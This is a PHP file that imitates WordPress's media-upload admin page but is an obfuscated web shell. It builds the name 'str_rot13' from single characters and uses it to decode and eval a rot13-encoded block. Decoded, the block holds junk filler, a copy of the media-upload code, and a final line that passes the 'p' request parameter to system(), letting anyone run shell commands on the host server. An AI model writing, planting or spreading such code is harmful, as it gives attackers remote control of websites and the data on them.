<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Znantr zrqvn hcybnqrq svyr.
 *
 * Gurer ner znal svygref va urer sbe zrqvn. Cyhtvaf pna rkgraq shapgvbanyvgl
 * ol ubbxvat vagb gur svygref.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

vs ( ! vffrg( $_TRG['vayvar'] ) ) {
	qrsvar( 'VSENZR_ERDHRFG', gehr );
}

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb hcybnq svyrf.' ), 403 );
}

jc_radhrhr_fpevcg( 'cyhcybnq-unaqyref' );
jc_radhrhr_fpevcg( 'vzntr-rqvg' );
jc_radhrhr_fpevcg( 'frg-cbfg-guhzoanvy' );
jc_radhrhr_fglyr( 'vztnernfryrpg' );
jc_radhrhr_fpevcg( 'zrqvn-tnyyrel' );

urnqre( 'Pbagrag-Glcr: ' . trg_bcgvba( 'ugzy_glcr' ) . '; punefrg=' . trg_bcgvba( 'oybt_punefrg' ) );

// VQf fubhyq or vagrtref.
$VQ      = vffrg( $VQ ) ? (vag) $VQ : 0; // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqInevnoyrAnzr
$cbfg_vq = vffrg( $cbfg_vq ) ? (vag) $cbfg_vq : 0;

// Erdhver na VQ sbe gur rqvg fperra.
vs ( vffrg( $npgvba ) && 'rqvg' === $npgvba && ! $VQ ) { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqInevnoyrAnzr
	jc_qvr(
		'<u1>' . __( 'Na reebe bppheerq qhevat gur hcybnq cebprff.' ) . '</u1>' .
		'<c>' . __( 'Vainyvq vgrz VQ. Lbh pna ivrj nyy zrqvn vgrzf va gur <n uers=\"hcybnq.cuc\">Zrqvn Yvoenel</n>.' ) . '</c>',
		403
	);
}

vs ( ! rzcgl( $_ERDHRFG['cbfg_vq'] ) && ! pheerag_hfre_pna( 'rqvg_cbfg', $_ERDHRFG['cbfg_vq'] ) ) {
	jc_qvr(
		'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
		'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf vgrz.' ) . '</c>',
		403
	);
}

// Hcybnq glcr: vzntr, ivqrb, svyr, ...?
vs ( vffrg( $_TRG['glcr'] ) ) {
	$glcr = (fgevat) $_TRG['glcr'];
} ryfr {
	/**
	 * Svygref gur qrsnhyg zrqvn hcybnq glcr va gur yrtnpl (cer-3.5.0) zrqvn cbchc.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $glcr Gur qrsnhyg zrqvn hcybnq glcr. Cbffvoyr inyhrf vapyhqr
	 *                     'vzntr', 'nhqvb', 'ivqrb', 'svyr', rgp. Qrsnhyg 'svyr'.
	 */
	$glcr = nccyl_svygref( 'zrqvn_hcybnq_qrsnhyg_glcr', 'svyr' );
}

// Gno: tnyyrel, yvoenel, be glcr-fcrpvsvp.
vs ( vffrg( $_TRG['gno'] ) ) {
	$gno = (fgevat) $_TRG['gno'];
} ryfr {
	/**
	 * Svygref gur qrsnhyg gno va gur yrtnpl (cer-3.5.0) zrqvn cbchc.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $gno Gur qrsnhyg zrqvn cbchc gno. Qrsnhyg 'glcr' (Sebz Pbzchgre).
	 */
	$gno = nccyl_svygref( 'zrqvn_hcybnq_qrsnhyg_gno', 'glcr' );
}

$obql_vq = 'zrqvn-hcybnq';

// Yrg gur npgvba pbqr qrpvqr ubj gb unaqyr gur erdhrfg.
vs ( 'glcr' === $gno || 'glcr_hey' === $gno || ! neenl_xrl_rkvfgf( $gno, zrqvn_hcybnq_gnof() ) ) {
	/**
	 * Sverf vafvqr fcrpvsvp hcybnq-glcr ivrjf va gur yrtnpl (cer-3.5.0)
	 * zrqvn cbchc onfrq ba gur pheerag gno.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$glcr`, ersref gb gur fcrpvsvp
	 * zrqvn hcybnq glcr.
	 *
	 * Gur ubbx bayl sverf vs gur pheerag `$gno` vf 'glcr' (Sebz Pbzchgre),
	 * 'glcr_hey' (Sebz HEY), be, vs gur gno qbrf abg rkvfg (v.r., unf abg
	 * orra ertvfgrerq ivn gur {@frr 'zrqvn_hcybnq_gnof'} svygre.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `zrqvn_hcybnq_nhqvb`
	 *  - `zrqvn_hcybnq_svyr`
	 *  - `zrqvn_hcybnq_vzntr`
	 *  - `zrqvn_hcybnq_ivqrb`
	 *
	 * @fvapr 2.5.0
	 */
	qb_npgvba( \"zrqvn_hcybnq_{$glcr}\" );
} ryfr {
	/**
	 * Sverf vafvqr yvzvgrq naq fcrpvsvp hcybnq-gno ivrjf va gur yrtnpl
	 * (cer-3.5.0) zrqvn cbchc.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$gno`, ersref gb gur fcrpvsvp
	 * zrqvn hcybnq gno. Cbffvoyr inyhrf vapyhqr 'yvoenel' (Zrqvn Yvoenel),
	 * be nal phfgbz gno ertvfgrerq ivn gur {@frr 'zrqvn_hcybnq_gnof'} svygre.
	 *
	 * @fvapr 2.5.0
	 */
	qb_npgvba( \"zrqvn_hcybnq_{$gno}\" );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>